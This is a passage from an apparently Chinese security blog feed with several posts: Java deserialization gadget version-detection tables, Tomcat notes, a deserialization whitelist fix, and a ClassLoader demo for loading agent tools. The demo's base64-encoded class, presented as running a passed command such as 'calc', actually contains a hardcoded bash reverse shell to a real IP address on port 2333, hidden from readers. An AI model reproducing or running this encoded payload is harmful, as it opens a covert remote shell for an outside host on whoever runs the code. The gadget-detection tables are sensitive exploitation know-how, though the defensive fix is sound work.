CommonsCollections4</strong></p><p>必须存在类：org.apache.commons.collections4.comparators.TransformingComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 4.1</td><td style="text-align:center">否</td><td style="text-align:center">存在org.apache.commons.collections4.FluentIterable</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">4.0</td><td style="text-align:center">否</td><td style="text-align:center">不存在org.apache.commons.collections4.FluentIterable</td><td style="text-align:center">无</td></tr></tbody></table></div><p><strong>6.3 CommonsBeanutils</strong></p><p>必须存在类：org.apache.commons.beanutils.BeanComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 1.9.0</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.BeanIntrospector</td><td style="text-align:center">-2044202215314119608</td></tr><tr><td style="text-align:center">1.7.0 &lt;=  &lt;= 1.8.3</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.collections.Buffer</td><td style="text-align:center">-3490850999041592962</td></tr><tr><td style="text-align:center">&gt;= 1.6 or = 20030211.134440</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.ConstructorUtils</td><td style="text-align:center">2573799559215537819</td></tr><tr><td style="text-align:center">&gt;= 1.5 or 20021128.082114 &gt; 1.4.1</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.BeanComparator</td><td style="text-align:center">5123381023979609048</td></tr></tbody></table></div><p><strong>6.4 c3p0</strong></p><p>必须存在：org.apache.commons.beanutils.BeanComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">0.9.5-pre9 ～ 0.9.5.5</td><td style="text-align:center">是</td><td style="text-align:center">存在com.mchange.v2.c3p0.test.AlwaysFailDataSource</td><td style="text-align:center">-2440162180985815128</td></tr><tr><td style="text-align:center">0.9.2-pre2-RELEASE ~ 0.9.5-pre8</td><td style="text-align:center">是</td><td style="text-align:center">不存在com.mchange.v2.c3p0.test.AlwaysFailDataSource</td><td style="text-align:center">7387108436934414104</td></tr></tbody></table></div><p>以c3p0为例子，我们判断的步骤应该是</p><ol><li><p>第一步判断com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase是否存在，若存在C3P0可用</p></li><li><p>第二步判断com.mchange.v2.c3p0.test.AlwaysFailDataSource是否存在，存在说明是高版本，suid切换-2440162180985815128。否则切换7387108436934414104 </p></li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li><p>Oracle jdk or Open jdk</p></li><li><p>是jre还是jdk</p></li><li><p>中间件类型（辅助构造回显/内存马）</p></li><li><p>使用的web框架</p></li><li><p>BCEL classloader是否存在  <strong>com.sun.org.apache.bcel.internal.util.ClassLoader</strong></p></li><li><p>判断java版本是否低于&lt;7u104（该版本可以00截断）</p></li><li><p>……</p></li></ol><p>本来想继续去寻找的可是有点累了，以后有时间去弄吧。。。。。respect </p><p>参考</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&amp;mid=2247484178&amp;idx=1&amp;sn=228ccc3d624f2d64a6c1d51555c42eea&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&amp;mpshare=1&amp;scene=23&amp;srcid=1231zSEsxQMxcrllvqoBgmcY&amp;sharer_sharetime=1640932147710&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">构造java探测class反序列化gadget</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深入学习tomcat</title>
      <link href="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/"/>
      <url>/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="深入学习tomcat"><a href="#深入学习tomcat" class="headerlink" title="深入学习tomcat"></a>深入学习tomcat</h1><h2 id="tomcat核心组件"><a href="#tomcat核心组件" class="headerlink" title="tomcat核心组件"></a>tomcat核心组件</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204195334994.png" alt="image-20220204195334994"></p><h2 id="核心组件的协助过程"><a href="#核心组件的协助过程" class="headerlink" title="核心组件的协助过程"></a>核心组件的协助过程</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204195638435.png" alt="image-20220204195638435"></p><h2 id="conf-server-xml"><a href="#conf-server-xml" class="headerlink" title="conf/server.xml"></a>conf/server.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Server</span> <span class="attr">port</span>=<span class="string">&quot;8005&quot;</span> <span class="attr">shutdown</span>=<span class="string">&quot;SHUTDOWN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Service</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    可以修改Catalina名字--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   连接器可以添加多个连接器就是端口和协议 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Engine</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span> <span class="attr">defaultHost</span>=<span class="string">&quot;localhost&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--      站点也可以添加多个 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span>  <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--修改默认的ROOT访问--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/demo&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;D://demo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Host</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Engine</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Server</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="tomcat请求流程"><a href="#tomcat请求流程" class="headerlink" title="tomcat请求流程"></a>tomcat请求流程</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204210315090.png" alt="image-20220204210315090"></p><h3 id="Pipeline结构"><a href="#Pipeline结构" class="headerlink" title="Pipeline结构"></a>Pipeline结构</h3><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204210545634.png" alt="image-20220204210545634"></p><p>每次在配置中添加value是在默认的pipeline的前面。</p><p>也就是tomcat的每一个组件之间的相互调用是通过pipeline去实现的</p>]]></content>
      
      
      <categories>
          
          <category> 学习tomcat </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>typora写博客文章</title>
      <link href="/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/"/>
      <url>/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="46b3a3037e2545471f24cd4d293c7424e99ad2e707dc3584e5058edea324cd80">48e22157b1ef105701eba779d55791b94473791e743914b36adcaf48d5050f2b2005e371a10b73d013c4c54714aece0e090f85d79c253fd59744a0112d7cfb2d41133fd1f2d8fbf8f7e8a5e776633ddaa887781d2bfd0746955830bc917cef41cc1c6611eb13efacd4d27c163cf8f701eba37529e937a8a13158b20fc1dc533ba4e0ab12fa20e6c75590a99db6e335696b963f83c5ff58fbab454623381798850e745727e193712d84369bd15c6f4ba0b8996e5d6b68d8503d26bb7a07e5e7b4f4504648e5be960e7ea1135daaf1ec9550d56c78d0fd501feffdefcb8fe42132cb2cf9c4e169521c2fb5477aafdad9779793af924d516f1587f8f66d916ec80b0fa93eea0172cabf2d050564844d69cb365e8d6d0d396d74a3da05d1dbfebba9557d40a97d2fab1e34ad2bd055e58b5f30141e5c28a16821b356a3615ce9500ac0a66d0ff16c66a1e1131f207366a8a05c82a5ea4364852d79afb2d430ea07267ceeca22dbd6936d39de42945375fe066032fbd102f134ccf4657108101065d1aedfa7db3046042c8388f96b7311cd9cf230ac524b2e31d451f1464144e72ed05473666e87aaf06307af322aebcfb6376c04423d965cc884f29a69f8b4482d03189b8f492f72ef05679692de3bfc5bff9bdfd550dece246e6de6fed781ec98d09ee157adceac5d7ddc23e8371034b48cd8baf9a432a4e4ac9699ee012d43151807ccfbff70ee731f0d5b9f14f31aac6acd0c653fcd9eafb599fd3d387195169354aa8e9ed5d953a85c997b64f95f7398ef48bbd5c896e577dee8dd7b141a91fb95b6192d119a59bf2878fd72c7cf00b236fb33b783ed73d5722849606f8ca43388923b233366d6ca70a5d2061600f7f18fa9b2f12a6e0ca67c941dc338fe9aa662af49530b2c224a03cb37635b9213b1f25d69e0919300e2d547f665fd0a6e545ac01a704cb30f4727eeddc45d7b6543b43e891ba79f67684851c82efb4084f1111d4136065e5aba9b3c72401793f5fd155418e626511e68f134eff646867645ab7948dfddb3b5a9020b012da22dbbf0e4ee4f39966ee4064e5fbb2f119fb5d6543470cb4767325882f311cc0e62aaf1379efd1f459904dc50fb7daf7f5b4b659f85a4d2413cd40210cd026a62b03b2981e579019478e70ba48171de5db24687bf0f5f79740262ba42d663cfde6e10ba76c744a5915a851c8a6e612134fc07e80514b56551b8b3e2c5ba21362ff782594ff1735b66a84f87cb002208cff9766ca3d347d0ce5eb730691d620deab3040f0a1a10450f24e57aa9bd3dd1adf03ac5e67355daddcc3a90b91e998ab158d961d23f60127f845ac87c039e09e60b4375cabecb0a5d985d2921b4987b7cc0b4f547a2a92e773729e0c07c9499e05cb08eada1f031255c27608b09fcfb29d8f4c0905213116cbccbcdeba3e16c7fdcd237c9b83998b127071064780b853456f8e058952cab6b7237c98b2fbfd5fbf5daa2301ec54e6db2bffb1aaf37a05658f78b5d6e701b1891c09057110d09fde00dbf03ed27d46e130137d39ddd43e492abb5ea1dd6c97a23097ecb36022f048e8bc55053c8cee7808aa25d56b97d1d4f5eed0ab44b28152b171904fea1e591baafa60428cad1f83194d3da34ec7db7c859dd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解决agent中tools加载的问题</title>
      <link href="/2022/11/10/%E8%A7%A3%E5%86%B3agent%E4%B8%ADtools%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/11/10/%E8%A7%A3%E5%86%B3agent%E4%B8%ADtools%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="解决agent中tools加载的问题"><a href="#解决agent中tools加载的问题" class="headerlink" title="解决agent中tools加载的问题"></a>解决agent中tools加载的问题</h1><p>为什么有这个文章？因为我们在利用agent中的运行中attach pid需要利用到tools.jar的类不过默认java是不加载tools.jar类的所以我们需要解决它</p><p>解决方法是学大师傅们的方法的。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>URLClassLoader去加载tools.jar路径并且将需要的类添加到map中，然后通过反射去实现。</p><p>代码：<a href="https://gist.github.com/Firebasky/c1efd9dc7eb964a77cb788c170a8598f">https://gist.github.com/Firebasky/c1efd9dc7eb964a77cb788c170a8598f</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>, <span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line"><span class="comment">//URL url1 = new URL(&quot;file:C:\\Program Files\\java\\jdk1.8.0_201\\lib\\tools.jar&quot;);</span></span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; url &#125;, Thread.currentThread().getContextClassLoader());</span><br></pre></td></tr></table></figure><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>自定义加载器</p><p><a href="https://xz.aliyun.com/t/10075#toc-4">https://xz.aliyun.com/t/10075#toc-4</a></p><blockquote><p>自定义的classLoader。但是我们都知道classLoader在loadClass的时候采用双亲委托机制，也就是如果系统中已经存在一个类，即使我们用自定义的classLoader去loadClass，也会返回系统内置的那个类。但是如果我们绕过loadClass，直接去defineClass即可从我们指定的字节码数组里创建类，而且类名我们可以任意自定义，重写java.lang.String都没问题:) 然后再用defineClass返回的Class去实例化。</p></blockquote><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.tools.attach;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String cmd)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException ee)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Myloader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="comment">//继承ClassLoader</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">get</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;<span class="comment">//直接使用defineClass返回class对象</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String classStr=<span class="string">&quot;yv66vgAAADkALgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwcADgEAEGphdmEvbGFuZy9TdHJpbmcIABABAAkvYmluL2Jhc2gIABIBAAItYwgAFAEAVmV4ZWMgNTw+L2Rldi90Y3AvMS4xMTYuMTM2LjEyMC8yMzMzO2NhdCA8JjUgfCB3aGlsZSByZWFkIGxpbmU7IGRvICRsaW5lIDI+JjUgPiY1OyBkb25lCgAIABYMABcAGAEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAaAQATamF2YS9pby9JT0V4Y2VwdGlvbggAHAEAA2NtZAgAHgEAAi9jBwAgAQAtY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC9MY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lOwEAB2V4ZWN1dGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBABNWaXJ0dWFsTWFjaGluZS5qYXZhACEAHwACAAAAAAACAAEABQAGAAEAIQAAAC8AAQABAAAABSq3AAGxAAAAAgAiAAAABgABAAAABQAjAAAADAABAAAABQAkACUAAAAJACYAJwABACEAAAC3AAUAAwAAADy4AAcGvQANWQMSD1NZBBIRU1kFEhNTtgAVV6cAIUy4AAcGvQANWQMSG1NZBBIdU1kFKlO2ABVXpwAETbEAAgAAABoAHQAZAB4ANwA6ABkAAwAiAAAAHgAHAAAACAAaAA4AHQAJAB4ACwA3AA0AOgAMADsADwAjAAAAFgACAB4AHQAoACkAAQAAADwAHAAqAAAAKwAAABkAA10HABn/ABwAAgcADQcAGQABBwAZ+gAAAAEALAAAAAIALQ==&quot;</span>;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myloader</span>().get(Base64.getDecoder().decode(classStr));</span><br><span class="line">            <span class="keyword">for</span> (Method m:result.getDeclaredMethods())</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(m.getName());</span><br><span class="line">                <span class="keyword">if</span> (m.getName().equals(<span class="string">&quot;execute&quot;</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    m.invoke(result,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不得不佩服大师傅啊！！！</p>]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>H4ckbird 祝你有美好的一天！</title>
      <link href="/2022/11/09/hello-world/"/>
      <url>/2022/11/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Test-My’s-Blog"><a href="#Test-My’s-Blog" class="headerlink" title="Test My’s Blog"></a>Test My’s Blog</h2><ul><li>如果能够看到这篇文章说明成功了</li><li>这里是显示的内容</li><li>我发现自己就是蠢货</li></ul><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate   hexo g</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy  hexo d</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java fix序列化漏洞</title>
      <link href="/2022/09/10/java-fix%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/09/10/java-fix%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="java-fix序列化漏洞"><a href="#java-fix序列化漏洞" class="headerlink" title="java fix序列化漏洞"></a>java fix序列化漏洞</h1><p>重点看了看java序列化的fix的操作，于是就简单的记录一下。</p><p><a href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">github上有一篇文章写的比较全</a>这里自己只是实现其中的一个方法，而该方法也是<a href="https://github.com/ikkisoft/SerialKiller">SerialKiller</a>项目的底层原理。</p><h4 id="hook-ObjectInputStream类的resolveClass方法"><a href="#hook-ObjectInputStream类的resolveClass方法" class="headerlink" title="hook ObjectInputStream类的resolveClass方法"></a>hook ObjectInputStream类的resolveClass方法</h4><blockquote><p>需要继承Java.io.ObjectInputStream实现一个子类，在子类中重写resolveClass方法，以实现在其中通过判断类名来过滤危险类。然后在JavaSerializer类中使用这个子类来读取序列化数据，从而修复漏洞。</p></blockquote><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xlh.fix.HookResolveClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HookObjectInputStream</span><span class="params">(InputStream inputStream)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化xlh.serialVersionUID.Address.class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(xlh.serialVersionUID.Address.class.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                    <span class="string">&quot;Unauthorized deserialization attempt&quot;</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xlh.fix.HookResolveClass;</span><br><span 